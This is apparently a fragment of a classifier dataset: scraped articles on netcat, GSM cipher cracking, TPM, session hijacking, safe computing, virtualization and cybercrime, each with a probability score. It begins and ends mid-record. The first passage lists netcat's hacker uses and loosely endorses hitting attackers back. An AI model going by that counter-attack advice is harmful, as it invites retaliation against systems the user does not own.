it can be used by a hacker for many things, including obtaining remote access to a shell, port-scanning and even hi-jacking services and bypassing firewalls. It can also be used to monitor ports and flood suspicious requests, similar to a buffer over-run, by using it to pretend you are running a service that you are not and using the 'yes' command when someone tries to exploit that service. Netcat is an extremely powerful application in itself and is usually part of any self-respecting hackers' tool-kit. Morally, you could look at this as hitting them back first. I hope that I have drawn your attention to some of the more basic but often overlooked entry-points that a hacker may use to gain entry to your web applications, and highlighted the need for basic auditing of the security enforcement of your site. This article is not intended to be a complete solution for defense against hacking, but more the starting point for your considerations. No site is completely hack-proof, but there are few sites that really need to be. As a web developer ,your main security concern is first to assess how much security you will actually need. The more secure you need to be, the more your aims will move toward hiring the services of a professional security solution.",
        "prob": "tensor([[3.2270e-06, 1.0000e+00]])"
    },
    {
        "text": "Computer security researchers say that the GSM phones used by the majority of the world's mobile phone users can be listened in on with just a few thousand dollars worth of hardware and some free open-source tools. In a presentation given at the Chaos Communication Conference in Berlin, researcher Karsten Nohl said that he had compiled 2 terabytes worth of data - cracking tables that can be used as a kind of reverse phone-book to determine the encryption key used to secure a GSM (Global System for Mobile communications) telephone conversation or text message. While Nohl stopped short of releasing a GSM-cracking device - that would be illegal in many countries - he said he divulged information that has been common knowledge in academic circles and made it \"practically useable.\" Intercepting mobile phone calls is illegal in many countries, but GSM-cracking tools are already available to law enforcement. Knoll believes that criminals are probably using them too. \"We have just basically copied what you can already buy in a commercial product,\" he said. The flaw lies in the 20-year-old encryption algorithm used by most carriers. It's a 64-bit cipher called A5/1 and it is simply too weak, according to Nohl. Using his tables, antennas, specialised software, and $30,000 worth of computing hardware to break the cipher, someone can crack the GSM encryption in real time and listen in on calls, he said. If the attacker was willing to wait a few minutes to record and crack the call, the total cost would be just a few thousand dollars, he said. There are about 3.5 billion GSM phones worldwide, making up about 80 percent of the mobile market, according to data from the GSM Alliance, a communications industry association representing operators and phone-makers. Because even discussing wiretapping tools can be illegal, researchers have steered clear of this type of work. But after consulting lawyers with the Electronic Frontier Foundation, Nohl and his collaborators set upon a way of conclusively disclosing the flaws in the GSM system without - they believe - breaking the law. Last August they kicked off an open-source project to create the cracking tables - something that would take a decent gaming computer about 10 years to compute - and they have shown which open-source tools could be used to intercept messages, but they have stopped short of designing a device to intercept the messages. This is, however, something that a technically sophisticated hacker could figure out, Nohl said. \"I don't think anything we did was illegal,\" Knoll said. However, \"using what we produced in certain circumstances would be illegal,\" he added. Two years ago, hackers David Hulton and Steve Miller embarked on a very similar project, but they did not complete their work, Nohl said. Knoll, who uses a BlackBerry GSM phone himself, says that the point of the research is to make it clear that encrypted GSM calls can be listened into. \"I certainly use my phone differently than before, trying to keep confidential calls on encrypted lines instead,\" he said. A spokeswoman with the GSM Association said that her group would be looking into the researchers' claims in the coming days and stressed that any type of mobile-phone eavesdropping would be illegal in many countries. \"This isn't something that we take lightly,\" she said in an e-mail interview. The group has developed a next-generation standard called A5/3 that is considered much more secure. That's the standard that is used on 3G networks to carry internet traffic.",
        "prob": "tensor([[2.1017e-06, 1.0000e+00]])"
    },
    {
        "text": "Jun 27, 2008 (08:06 PM EDT) A Tipping Point For The Trusted Platform Module? Read the Original Article at InformationWeek The Trusted Platform Module is a hardware component built into PCs and laptops. It's designed to securely generate and store encryption keys, passwords, and digital certificates. The Trusted Platform Module, or TPM, can be used for a variety of purposes, such as encrypting files and folders and authenticating users, applications, and computers. According to IDC, nearly 250 million PCs will have shipped with TPM hardware by 2009. In theory, this level of deployment means the module should be the foundation for a variety of useful applications widely embraced by enterprises and individual users. In reality, there are few apps that take advantage of TPM. A major reason is the complexity of managing TPM itself and encryption keys; another may be a lack of awareness of the module and its capabilities. The Trusted Platform Module is developed by the Trusted Computing Group, a nonprofit organization that designs and develops open specifications for trusted computing. It has approximately 170 members. The module was designed to help organizations protect sensitive information and enable strong authentication for business use and e-commerce transactions. TPM's hardware-based key-generation capabilities make it very secure against many common attacks. We'll examine why TPM adoption hasn't matched physical deployments and look at the prospects for wider use of the technology. A BRIEF HISTORY OF TPM Unfortunately for the Trusted Computing Group, Palladium generated a firestorm of negative feedback. Critics argued that Palladium was primarily designed to take control away from the owner of a computer, and privacy rights advocates were riled up over the fact that it was difficult for TPM to allow sufficiently anonymous verifiable transactions. Fortunately, the 1.2 version of the specification has significantly improved the ability for TPM to be used in a way that maintains privacy while still achieving security. The primary criticism was that one of the stated design goals of TPM is that it could be used to create supposedly unhackable digital rights management systems. DRM technology aims to prevent users from copying and sharing digital content, such as music and movies. Many in the technology community argue that DRM restricts their fair-use rights and pits users against their own computers. (click image for larger view) LOCK IT UP While a Trusted Platform Module chip could be applied to DRM, it's far from the most common use-case of the technology today. More important in the TPM ecosystem are the other possibilities it affords. The Trusted Computing Group encompasses a variety of platforms, including working groups dedicated to Authentication, Mobile, Software Stack, Storage, Trusted Network Connect, and Virtualized Platform. The most widespread use of TPM today is Microsoft's BitLocker drive encryption technology. BitLocker can operate with or without the TPM hardware, though the recommended and most secure method of operation requires a 1.2 TPM chip, and it's able to offer significantly more security than non-TPM modes of operation. That's because the keys are secured in the hardware rather than in software, making them harder to tamper with or steal. Also teaming up with TPM for data encryption are hard drives capable of handling data encryption and decryption internally, such as Seagate Momentus FDE.2 drives. This is one of the few full-disk encryption architectures that would not be vulnerable to the recently publicized \"cold-boot\" attacks that are able to extract the contents of a computer's memory after it's been powered off and seek out encryption keys. The Web is one reason the Trusted Computing Group repurposed itself from the original goals of Trusted Computing Platform Alliance back in 2003. Instead of creating a platform for trusted PC computing, it wanted to be able to integrate the same techniques across a wide variety of uses and platforms. Of course, integrating TPM into the authentication process for a Web application negates one of the values of Web apps in the first place--they're accessible from any Internet-enabled PC. This problem may be solved by cell phones, which could act as a soft token to authenticate users. For example, if a user wants to access an online banking application from a strange machine, the bank can send a one-time password to the user's phone. The user would enter this password into the banking app. Meanwhile, the entire process is secured against tampering by TPM's hardware-enabled trusted connection from the server to the PC being used. This leads directly into the weak spot for TPM--key management. Managing the keys protected by a TPM chip is almost identical to any other encryption platform. Not only must those TPM-generated keys support the usual enterprise key management features--such as enrollment and revocation, and key recovery in case of lost PINs--but there are issues unique to TPM, such as maintaining system state when upgrading, as changes may upset the ability of the module to produce a valid key for an encrypted system. Some standalone software tools already are available for IT to manage the Trusted Platform Module. For example, Microsoft offers some free TPM management tools. And a large number of OEMs that manufacture PCs and laptops ship Wave Systems' Embassy Trust Suite, which is capable of providing a variety of services to maintain the module itself. However, more powerful management capabilities might require an upgrade to one of Wave's enterprise-level products. Even without an enterprise management platform, however, some organizations may be able to take advantage of the number of TPM chips deployed in their environment right now. The Trusted Computing Group Web site offers a series of white papers on using TPM with existing enterprise systems such as wireless networks, VPNs, and network access control. While it's important to consider the extra management effort involved, it's definitely worth examining what you can use for free with the built-in tools along with the module. TPM: A Matter Of Trust",
        "prob": "tensor([[2.0295e-06, 1.0000e+00]])"
    },
    {
        "text": "Freedom of Information Act Gallery 2010 In recognition of Sunshine Week March 15-19, 2010 The Freedom of Information Act establishes a legal right for individuals to obtain records in the possession of government agencies. The FOIA is critical for the functioning of democratic government because it helps ensure that the public is fully informed about matters of public concern. The FOIA has helped uncover fraud, waste, and abuse in the federal government. It has become particularly important in the last few years as the government has tried to keep more of its activities secret. A hallmark of the new surveillance measures proposed by various government agencies is their disregard for public accountability. As the government seeks to expand its power to collect information about individuals, it increasingly hides that surveillance power behind a wall of secrecy. Congress has long recognized this tendency in the Executive Branch, and sought to limit government secrecy by creating legal obligations of openness under the FOIA and the Privacy Act of 1974. EPIC has used these open government laws aggressively to enable public oversight of potentially invasive surveillance initiatives. Public access through the FOIA not only allows for a more informed public debate over new surveillance proposals, but also ensures accountability for government officials. Public debate fosters the development of more robust security systems and leads to solutions that better respect the nation's democratic values. EPIC's FOIA litigation activity over the past year has resulted in disclosure of information about several government surveillance programs. The EPIC FOIA Gallery highlights some of the most significant documents we obtained in the past year. Through Freedom of Information Act litigation, EPIC obtained contracts and technical specifications for body scanners, machines used to perform digital strip searches of air travelers. The documents include 250 pages of technical data. They reveal that scanners can record, store, and transmit images of Americans stripped naked. This contradicts assurances made by the Transportation Security Administration. The TSA withheld additional records sought by EPIC, including full-resolution body scanner images and documents detailing traveler complaints. EPIC's lawsuit for additional records remains pending. Responding to an EPIC FOIA lawsuit, the Department of Homeland Security and the Transportation Security Administration released documents about body scanners in US airports that included complaints from travelers who went through the devices. Travelers reported that they were not told about a pat down alternative or that they were going to be subject to a body scan by TSA officials. Travelers also expressed concern about radiation risks to pregnant women, and the image capture of young children without clothes. Following a FOIA request, EPIC obtained documents that revealed the Defense Department canceled a contract with Echometrix following an EPIC complaint to the FTC in 2009. Echometrix produces parental control software that monitors children’s online activity. Echometrix analyzes the information collected from children and sells the data to third parties for market-intelligence research. The EPIC complaint alleges that Echometrix engages in unfair and deceptive trade practices by representing that the software protects children online while simultaneously collecting and disclosing information about children’s online activity. Subsequently, the Army and Air Force Exchange Service pulled My Military Sentry, which collects data for marketing purposes, from its online store. The FTC has not yet pursued action against the software company. In response to EPIC’s April 2009 FOIA request, the General Services Administration released several contracts between the federal government and web 2.0 companies. The GSA Agreement with Google exempts the company from privacy requirements, stating: “to the extent any rules or guidelines exist prohibiting the use of persistent cookies in connection with Provider Content applies to Google, Provider expressly waives those rules or guidelines as they may apply to Google.” The documents also include agreements with Blip.tv, Blist, Google (YouTube), Yahoo (Flickr), and MySpace. EPIC also obtained amendments to agreements with Facebook, Slideshare.net, Vimeo.com, and AddThis.com. Some of the agreements permit companies to track users of government web sites for advertising purposes. In September 2009, EPIC and the ACLU filed court papers in Washington, DC asking a federal judge now reviewing an open government case to consider the publication of the Inspectors General Unclassified Report on President Bush's warrantless wiretapping program. EPIC is seeking the release of the relevant legal memos relating to the program, but the government contends that the entire matter is secret. However, the Inspector General's report, which is widely available, discusses several of the memos at issue in the case. EPIC filed the original request for the legal memos in December 2005 after the New York Times first reported on the warrantless wiretapping program. The case is EPIC v. Dep't of Justice. In response to a January 2009 FOIA request to the Department of Homeland Security, EPIC obtained documents revealing that the DHS spent $3 million on a marketing and advertising campaign to promote its E-Verify system. The DHS contracted with Maya Advertising and Communications to launch a campaign “to increase voluntary adoption of the [Employment Eligibility Verification Program] for all sectors of US employers.” In 2007, EPIC testified in Congress that the employment eligibility database is filled with errors and warned that determination errors are likely. Errors can seriously harm American workers, because they can lead to American citizens losing their jobs. EPIC has documented how the use of such a database imposes problems for U.S. workers.",
        "prob": "tensor([[1.9721e-06, 1.0000e+00]])"
    },
    {
        "text": "The public should be prepared for more inconclusive BSE, or mad cow disease, reports because of expanded testing launched June 1 by the USDA. David Smith and David Steffen, University of Nebraska veterinary scientists, say the larger sampling of animals in the USDA's expanded BSE surveillance testing will result in more inconclusive findings from initial rapid screening. As of Tuesday June 29, 8,585 cattle had been screened since June 1. \"Anytime you expand testing, you are bound to have more tests that are inconclusive,\" Smith says. On June 25, USDA announced that an animal produced an inconclusive instead of negative result in initial screening for bovine spongiform encephalopathy, or BSE. Late on June 29, USDA announced a second inconclusive result from initial screening. In both instances, further tests are being conducted at USDA's National Veterinary Laboratory in Ames, Iowa. Cattle futures prices fell sharply June 28 in response to the previous Friday's announcement, but rebounded somewhat on June 29. Fed cattle prices dropped from $90 to $75 shortly after the nation's only confirmed case of BSE was detected in a dairy cow in Washington in late December, says Darrell Mark, a university livestock marketing specialist. Since then, prices have been rising steadily and are up 20% from early year lows. \"The industry was expecting approximately one inconclusive test per 10,000 samples, and after one month and slightly less than that number tested, having two inconclusive tests may indicate we'll see more of these than expected,\" Mark says. \"This will increase market volatility and cause consumers to question the BSE surveillance program.\" But the surveillance program is working as it was designed to, he adds. Smith says the public and the markets need to become accustomed to the testing process and the related announcements that will be forthcoming. After the December incident, the USDA was criticized for not disclosing the incident sooner. Steffen adds, \"If there is a false positive for every 1,000 tests, then the USDA could expect hundreds of false positive reports from the 200,000 tests to be conducted by next June. The public and the markets need to be prepared for that.\" With the resulting drop in cattle futures prices, Mark says some people are asking why the USDA notified the public of the inconclusive results. \"Last time the USDA drew criticism for not announcing sooner,\" says Mark, who noted that full disclosure will benefit the beef industry if people understand the real issues behind the testing process. \"The press release from USDA about the (June 25) finding was very clear, but right away a few people started talking about it like it was a new confirmed case of BSE,\" he says.",
        "prob": "tensor([[2.3839e-06, 1.0000e+00]])"
    },
    {
        "text": "Some time ago there was a big fuzz over Firesheep: by listening to wifi traffic your login session can be stolen which is very bad because now somebody can e.g. send emails on your behalf. Some people said that using SSL for the whole site was the only solution. But I didn't think this was true: if you can keep the password or equivalent stored on the client side, and you never send this to the server but rather authenticate every request you do with this password, then nobody can impersonate you (unless they know your password). For example when you do a HTTP request req, you instead do the request r + \"?hmac=HMAC(password, req)\" to prove that you know the password. Then I came across a paper on a protocol called SessionLock, which is targeted at solving the same problem. It is a bit different than what I described above, and I have some questions about it. First, why do they establish a shared secret over SSL or using the Diffie-Hellman protocol, when there already is a shared secret available (the password or a hashed version of the password)? Second, about the version that uses Diffie-Hellman they say: If the browser loses its secret, it can re-perform a Diffie-Hellman key exchange with the server, using a number of XMLHttpRequest calls. Can somebody explain how this works? Supposedly the client side didn't save the password, and it also lost the shared secret. So as far as I can see the client side knows nothing, yet he is able to re-establish a shared secret that can be used to do authenticated stuff. Wouldn't an attacker be able to do exactly the same? What am I missing?",
        "prob": "tensor([[3.0618e-06, 1.0000e+00]])"
    },
    {
        "text": "Suppose you want to send a letter to your brother. And let’s suppose it’s got some, oh, maybe potentially embarrassing financial information – he owes you some money and you’re having trouble paying the bills. Obviously, that’s not the sort of thing you want to put on a postcard; you’d put that in an envelope. (Your brother is notorious about checking his email). You want him to know that the letter is actually from you, so you sign it – you have a distinct signature that is very hard to forge. And, on top of that, you want him to know that nobody else read the letter, so you also sign across the fold of the envelope, so it can’t just be put in a new envelope. So, you’ve done the basic security – it’s authenticated (with your signature), it’s not readable by third parties (because of the envelope) and it’s tamper-evident (because you signed the envelope, too). It’s not the most secure communication possible, but you’ve clearly done due diligence. So what if I told you people were doing that almost 4000 years ago? Sealing letters in clay envelopes was standard practice. Sometimes it was used for security; other times, in the case of contracts, the contract was written on the inner tablet and the envelope, and both marked with the personal seals of the signatories, making the text of the contract accessible while still having an unalterable copy in case it came into question. People have known for millennia that secure communication is crucial to business. We’ve known a need for privacy, authentication, and tamper evidence. These aren’t new ideas at all. However, we seem to have a hard time applying them to modern technology, sadly. That’s the only reason I can figure out to explain why yesterday I had someone asking me to email a scanned image of a check without any encryption.",
        "prob": "tensor([[5.4010e-05, 9.9995e-01]])"
    },
    {
        "text": "Hackers and new computer viruses seem to be in the news more frequently, along with regular warnings to update your virus protection and protect your privacy. The task of keeping your computer safe can seem overwhelming. So, what can you do to safeguard access to your computer and to protect yourself and your family from cyber intrusion? Know the terminology The first step is to recognize the risks and become familiar with some terminology. Hackers, attackers or intruders are terms applied to the people who seek to exploit weaknesses in software and computer systems for their own gain. Their actions can range from mischief (creating a virus with no intentionally negative impact) to malicious (stealing or altering information). Malicious code includes code such as viruses, worms and Trojan horses. Although some people use these terms interchangeably, they have unique characteristics: - Viruses — This type of malicious code requires you to actually do something before it infects your computer. This action could be opening an e-mail attachment or going to a particular Web page. - Worms — Worms propagate without you doing anything. They typically start by exploiting a software vulnerability (a flaw that allows the software's intended security policy to be violated). Then once the victim computer has been infected, the worm will attempt to find and infect other computers. Similar to viruses, worms can propagate via e-mail, websites or network-based software. The automated self-propagation of worms distinguishes them from viruses. - Trojan horses — A Trojan horse program is software that claims to do one thing while, in fact, doing something different behind the scenes. For example, a program that claims it will speed up your computer may actually be sending your confidential information to an intruder. - Spyware — This sneaky software rides its way onto computers when you download screensavers, games, music and other applications. Spyware sends information about what you're doing on the Internet to a third-party, usually to target you with pop-up ads. Minimize access to your information As long as you have a computer and connect it to a network or the Internet, you are vulnerable to someone or something else remotely accessing or corrupting your information. Here are some tips to make it more difficult for someone to do this: - Lock or log-off your computer when you are away from it. This prevents another person from then sitting down at your computer and accessing all of your information. - To be really secure, disconnect your computer from the Internet when you aren't using it. The likelihood that attackers or viruses scanning the network for available computers will target your computer becomes much higher if your computer is always connected. - Evaluate your security settings. Many, but not all Internet providers offer free security software. If you don't receive free software, you should consider buying a commercial product that includes virus scan, firewall and pop-up blockers. You should also be aware of your Internet cookies setting. Cookies are short pieces of data used by Web servers to identify users. Some cookies are useful for storing images and data from websites that you frequent, but others are malicious and collect information about you. You'll have to decide how much risk from cookies you can accept. - Browsers enable you to block pop-up ads. You can also install anti-spyware to block them. - Look for signals that you are using a secure web page. A secure site encrypts or scrambles personal information so it cannot be easily intercepted. Signals include a screen notice that says you are on a secure site, a closed lock or unbroken key in the bottom corner of your screen, or having the first letters of the Internet address you are viewing change from \"http\" to \"https.\"",
        "prob": "tensor([[2.0501e-06, 1.0000e+00]])"
    },
    {
        "text": "www.netsmartz.org - Internet safety for all ages – awesome activities to do with your child - Instant messengers and internet filter/blocker reviews plain language explanations of software – Internet safety for k-6 OnGuard Online provides practical tips from the federal government and the technology community to help you guard against internet fraud, secure your computers, and protect www.webwisekids.org - Kids, parents, teachers and law enforcement discover innovative Internet safety education programs to protect today’s youth from online dangers. Common Sense Media.org – Excellent site for parents and educators. Parents can find reviews of movies, video games, kid-friendly apps, and great advice for talking to your kids about all things digital. Educators can download the Digital Citizenship Curriculum for k-12 – free!!!! Net Family News – Great newsletter for parents and educators regarding kids’ use of up with emerging trends in technology and Internet Safety Information for parents and teens on using technology provides a great guide for how to set the recommended privacy settings for facebook. Cyberbullyhelp.org – Educate yourself regarding cyberbullying on this site. It also provides quick links to report abuse on facebook, Twitter, Instagram, etc. ABCs of Cyberbullying for Cyberbullying Quick Reference Guide for Parents Help Tips for Reporting Offensive Profiles To Social Networking Sites here for adobe pdf of this section) Compiled by Patti Agatston, Ph.D. MySpace provides a link in their help center to report offensive profiles. You can also enter this url to get to the help page that has a link to report harassment or threats: Educators can report an “imposter profile” that targets them on MySpace. This is also under the help center and frequently asked questions. The link for educators to report fake profiles targeting faculty members is: can request that their child’s profile be removed. The link to make that request is on the parent safety tips page. Here is the url: Anyone can report inappropriate content. This information is also on the help page. The link is: Abuse can be reported by e-mailing Facebook directly at email@example.com. There is also a link provided under the security page of Facebook. The security page link is: Scroll down to the security section and click on the link to report abuse. 2. If someone is harassing/libeling you, Facebook gives the following suggest that you block the person by listing his or her name in the \"Blocking People\" box at the bottom of the My Privacy page. If this does not resolve the problem, please write an email to firstname.lastname@example.org from your login email address. We will need to know your name, login email address, and school. Also, please provide the name and school of the person who is harassing you along with a description of the situation.” 3. Use the e-mail email@example.com to report any other information that you think should not 1. Schools and parents can contact Xanga for help at the following url: 2. Xanga also provides a link to wiredsafety’s cyber abuse hotline for severe cases of cyber bullying or other abuses such as cyberstalking, identity theft and child exploitation. The link to wired safety’s cyberabuse hotline is: The guidelines for uploading appropriate videos are posted on Youtube’s community guidelines. Here is the link: Anyone can flag a video as inappropriate. If Youtube reviews the video and finds it to be inappropriate, the video is shut down. If they decide to terminate the user’s account the user is prohibited from ever having another account on Youtube. Check your zip code for Pedophiles How to check where they surfed the history, if the history is blank then ask why they cleared it. the Temporary internet files. Click on tools/internet options/settings/view file. will give you a list of all of the graphics and cookies downloaded onto Click on a couple and see if they are appropriate. Run a Spyware blocking program My House Rules feel threatened, come get the parent to help save the conversation (if you get mad and exit, all the data is gone). talk about other people, our feelings, or personal information on-line – ever, end of story. - Other kids can sign on with other people’s accounts and pretend to be someone different – be aware of out of the ordinary questions. Articles and fact sheets about youth culture Send questions or comments to Jeff Page last updated on",
        "prob": "tensor([[0.0046, 0.9954]])"
    },
    {
        "text": "Operating systems can't tell the difference between a virtual machine and a physical machine, but manufacturers are seeing -- and celebrating -- the notable difference virtualization is having on their bottom line. With aging plant infrastructures, tighter regulations, data security issues and numerous other challenges to address, process engineers want to get the most from their IT-based plant assets. To do this, many have included virtualization in their automation migration plans. Virtualization is rapidly transforming the IT landscape, and fundamentally changing the way you use hardware resources. And the return on investment (ROI) is nearly immediate because virtualization helps you build an infrastructure that better leverages manufacturing resources and delivers high availability. What is Virtualization? Virtualization is a software technology that decouples the physical hardware of a computer from its operating system (OS) and software applications, creating a pure software instance of the former physical computer -- commonly referred to as a Virtual Machine (VM). A VM behaves exactly like a physical computer, contains it own \"virtual\" CPU, RAM hard disk and network interface card, and runs as an isolated guest OS installation within your host OS. The terms \"host\" and \"guest\" are used to help distinguish the software that runs on the actual machine (host) from the software that runs on the virtual machine (guest). Virtualization works by inserting a layer of software called a \"hypervisor\" directly on the computer hardware or on a host OS. A hypervisor allows multiple OSs, \"guests,\" to run concurrently on a host computer (the actual machine on which the virtualization takes place). Conceptually, a hypervisor is one level higher than a supervisory program. It presents to the guest OS a virtual operating platform and manages the execution of the guest OSs. |Virtual machines can be run on any virtualization-enabled physical server, creating a pool of computer resources that helps ensure your highest-priority applications will always have the resources you need without wasting money on excess hardware only needed for peak times.| Virtualization in Action But the benefits of virtualization go far beyond the consolidation of computers. Many manufacturers use virtualization to extend their software's longevity. Consider the case of Genentech, a biotech company based in South San Francisco, California. Genentech specializes in using human genetic information to develop and manufacture medicines to treat patients with serious or life-threatening medical conditions. The company estimated that the costs to upgrade one of its Windows 95 PC-based HMIs to a Windows Server 2003-based system would be approximately $40,000. Final figures topped $100,000 because of costs associated with validating the system for use in a regulated industry. Assuming that OSs are updated about every five years, costs quickly become a limiting factor in keeping an installed base of manufacturing computers up-to-date. Additional factors also contribute to the cost of upgrades. \"Computer hardware changes even more frequently than operating systems,\" says Anthony Baker, system engineer at Rockwell Automation. \"Each change incurs engineering expenses and possibly production downtime.\" So instead of investing in the upgrades, Genentech implemented virtualization. According to Dallas West, [insert title], at Genentech, one of the most lasting effects of virtualization is that it allows legacy operating systems, such as Windows 95, Windows NT, etc., to be run successfully on computers manufactured today. This extends HMI product lifecycles from 5-7 years to 10-15 years and possibly longer. \"Having the ability to extend the useful life of a computer system allows a manufacturer to create a planned, predictable upgrade cycle commensurate with its business objectives,\" West says. \"No longer is a business forced to upgrade its systems because a software vendor has come out with a new version. Upgrading systems can once again be driven by adding top-line business value by choosing to upgrade when new features become available that will provide an acceptable return on investment,\" he explains. Why Virtualization is a Big Deal Virtualized assets also help increase productivity. By not having to maintain physical hardware, administrators are able to carry a heavier workload. A recent study by analyst IDC found that administrators manage an average of about 30 servers. After virtualization, they can manage 60-90 servers -- a significant increase in capacity. They're also able to spend more time architecting their infrastructure for higher levels of productivity. \"Gone are the days of \"server sprawl,\" where a new server is needed for each new application or tool and each ends up running at only 8-10% utilization,\" Baker says. Virtualization allows companies to create a scalable infrastructure, where new VMs can be added without the need to continuously buy new hardware and other physical devices. When manufacturers start to consolidate, they find they can buy and allocate the appropriate amount of resources for each VM, which reduces system maintenance and energy consumption costs. Another feature of virtualization is that the system doesn't know it's \"virtualized.\" This allows administrators to take hardware offline while the system is up and running. \"Since the VMs are not attached to a physical computer, the VMs can be migrated between servers while the system is still running,\" notes Baker. During a planned outage, administrators can shift their workloads so the server can be taken down with no impact to the system. When the planned outage is complete, the server can be placed back into service. Advantages of a Virtual Machine: - Hardware independence - Fault tolerance - Application-load balancing - Rapid disaster recovery - Recovery to non-identical hardware - Ability to pre-test OS patches or vendor updates - Ability to roll-back incompatible OS patches or vendor updates - Reduced TCO resulting from consistent datacenter environment - Reduced power usage Baker adds, \"Rockwell Automation recognizes our customers' desire to make use of the opportunities that virtualization brings to mission critical applications. That's why we've worked closely with VMware, the leader in virtualization technologies, to establish a technical partnership.\" Rockwell Automation supports its software suite in virtualized environments, and has developed a list of software products that are recognized by VMware as \"VMware Ready.\" Today, most Rockwell Automation configuration, human interface and information products are certified as VMware ready, and Rockwell Automation is committed to testing all new software products in a virtual environment. Applying Virtual Assets Using specially designed host hardware available on the market today, a virtual server can be sized with extensive memory and CPU resources. This allows a large number of VMs to be consolidated onto a single machine without impacting performance. You can create a data center by running a group of servers with hypervisors managed via a virtualization infrastructure management interface. The bare-metal environment frees up a large portion of resources, which can then be dedicated to running the VMs. Tips for Getting Started If you're thinking about virtualization for your manufacturing facility, consider the following advice: - Being able to run legacy software indefinitely doesn't mean you should. If you find a software bug in an old system, don't count on it being fixed. You'll also want to consider the security implications of running legacy software. Virtualization should be used as a tool to moderately extend the life cycle of a computer system to allow an upgrade to take place in a planned and predictable manner when a suitable business driver emerges. - Not all network protocols are easily virtualized. The use of standard Ethernet is most widely supported by the various virtualization vendors. - Non x86-based systems (ie. SPARC, DEC-Alpha, etc.) cannot be virtualized to run on a x86-based machine, such as Intel, Advanced Micro Devices (AMD), etc. - Third-party vendor support for virtualized systems has been limited. There is an added risk of running virtualized software in a production environment that has not been thoroughly tested and endorsed by a respective third-party vendor. More information about Rockwell Automation Process Solutions can be found at www.rockwellautomation.com/go/process",
        "prob": "tensor([[3.9782e-06, 1.0000e+00]])"
    },
    {
        "text": "Solaris 11 Supports Two Forms Of VirtualizationOracle's first update of Sun's Unix includes support for Oracle VM hypervisor and Solaris Zones. Support for the Oracle VM hypervisor, derived originally by Sun Microsystems from the Xen open source code, has been added to Solaris. That means Solaris can host virtual machines on either a Sparc server or on a standard Intel or AMD x86 server under Solaris 11 for x86. Unix RISC servers are typically more powerful than x86 servers and are still used for large databases or other demanding applications that have high transaction throughput. Support for Oracle VM gives Solaris users both options. - The Critical Importance of High Performance Data Integration for Big Data Analytics - Come Together, Right Now, Part 1: The Why, When and How of IT Convergence - Top 10 Considerations for Getting Started with Virtualization - Beyond Cost Savings: Four Compelling Reasons to Expand Virtualization of Your IT Environment In addition, Solaris includes a second virtualization option, first added to Solaris 10 when it was released in 2005. That's Solaris Zones, a method of dividing up a host server's resources among many applications each in its own software partition, known as a container or zone. For example, a zone would assign an application a share of memory, CPU, network bandwidth, and access to the operating system. A single Solaris host can run \"hundreds\" of zones, said Markus Flierl, VP of Oracle software development, in an interview. It's difficult to directly compare how many zones versus full bore virtual machines might run on a same-sized server, but most virtual machine hosts run fewer than 100. More zones can be run on a single host than VMs because, while each zone contains an application, all the applications make use of a single, shared Solaris operating system kernel. In many cases, they share Solaris root directories, such as /usr and /lib, according to a blogger's FAQ as well. Such sharing does not go on in typical x86 virtualized environments. In VMware or Microsoft Hyper-V virtual machines, each application is paired up with its own operating system. That leaves many operating systems making demands on the host, instead of just one. A zone has one-fifteenth the overhead of a VMware ESX Server virtual machine, claimed Markus Flierl, Oracle VP of software development, in an interview. Zones also run \"without artificial limits on memory,\" he added, perhaps a swipe at the new 96-GB limit for a virtual machine running under a VMware enterprise license. \"With Solaris 11, the options for virtualization have dramatically expanded,\" he said. [ Want to see a case where a business adopted \"containers\" instead of VMs? See 'Containers' Outperform Virtualization For KV Pharmaceuticals ] Oracle has added virtual environment management features to Solaris 11 as well. A system administrator may virtualize both network and storage resources to go with the zones or virtual machines generated under a single instance of Solaris. The ability to define network and storage resources to work with other virtualized assets makes it easier to set up complete, virtualized environments, said Charlie Boyle, senior director of product marketing. Because Solaris 11 includes the added virtualization features, it was dubbed \"the first cloud operating system\" upon release Nov. 11. In this use of the term \"cloud,\" a single Solaris system can operate with more flexible and elastic characteristics and manage more virtualized resources than before; nothing in the announcement indicated that it was it was intended to manage thousands of servers with automated provisioning of end users in a cloud data center. The ZFS file system is part of Solaris 11, and its data deduplication capabilities mean storage requirements for a virtualized system under Solaris 11 may be reduced to one-tenth their previous level, said Boyle. Solaris 11 has been engineered to work better with Oracle applications, the Oracle 11g database system and Oracle Fusion Middleware, he added. Unix has been the sick-old-man of operating systems for so long that some have prematurely written its obituary. Headlines declaring the death of Unix have appeared regularly, but their writers overlook the fact that revenues from Unix servers and software experienced a small uptick this year, according to IDG. It's a market that exceeds $18 billion a year. Solaris' main commercial competitors are IBM's AIX and HP's HP-UX and they also offer partitioning of servers into containers. Linux competes with Solaris as open source code. Oracle discontinued the community open source version of Solaris in August last year and replaced it with a free version, Solaris Express. Unix is still the operating system of choice for the largest enterprise databases and other large systems doing a specialized, mission critical workload, as opposed to clusters of x86 servers. For more analysis, see a report on Gabriel Consulting, Survey: The Demise Of Unix Is Greatly Exaggerated . \"There has been a lot of ill-considered press coverage about the 'death' of Unix and coverage of the wholesale migration of Unix workloads to Linux, some of which (the latter, not the former) I have contributed to. But to set the record straight, the extinction of Unix is not going to happen in our lifetime,\" wrote Richard Fischera, analyst at Forrester Research, on Oct. 26 in \"Unix--Dead or Alive?\"",
        "prob": "tensor([[2.5156e-05, 9.9997e-01]])"
    },
    {
        "text": "RONNIE L. WILLIAMS Despite increased awareness of cybercrime, cyber-attacks continue to plague companies from Memphis to Brussels to Subic Bay. Cyber attacks are typically defined as criminal activities that are conducted by means of the Internet. With more and more companies relying on the Internet to do business, the frequency of cybercrime is certain to increase. These technology-based attacks can include stealing an organization’s intellectual property, gaining access to online bank accounts, creating and distributing viruses, and posting confidential business information on the Internet. A recent survey by PricewaterhouseCoopers found that 38 percent of the financial service firms surveyed have been hit by cybercrime of one sort or another. Although the financial service industry may experience a higher rate of cybercrime due to the nature of their business, cybercrime is a real threat to other industries as well. The financial impact of cybercrimes can be devastating and the reputational damage may be ruinous for a company. The most costly cybercrimes are those caused by malicious code, denial of service, stolen devices and Web-based attacks. Malicious code and denial of service are typically the most common of the reported cyber attacks and include viruses, worms and Trojan horses. Cyber crooks are utilizing more and more elaborate schemes in order to swindle businesses out of money, time and resources. Last year, the Department of Justice and the FBI announced the indictment of two individuals from Latvia and the seizure of more than 40 computers, servers and bank accounts as part of Operation Trident Tribunal, an ongoing, coordinated enforcement action targeting international cybercrime. This particular operation took down a cybercrime ring that caused more than $74 million in total losses to 1 million computer users. The size and extent of this cybercrime ring demonstrates the reach of the criminals and the financial impact their activities can generate. Mitigation of cyber attacks can be a harrowing task. The cyber crooks are 